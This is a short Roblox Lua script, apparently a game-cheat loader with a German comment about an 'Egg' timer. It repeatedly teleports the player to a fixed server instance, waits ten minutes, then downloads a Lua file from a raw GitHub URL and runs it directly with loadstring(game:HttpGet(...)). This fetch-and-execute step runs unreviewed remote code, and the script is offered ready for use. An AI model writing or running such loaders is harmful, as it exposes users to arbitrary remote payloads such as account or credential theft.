-- Zeit in Sekunden, wie lange das Egg verfügbar ist
local EggTimeLeft = 600
while true do
    game:GetService("TeleportService"):TeleportToPlaceInstance(85896571713843, "cf0548d1-03e1-4052-8e17-11d994f319c2")
    wait(EggTimeLeft)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PxnifyDev/roblox-job-ids/main/data/Loader.lua"))()
end
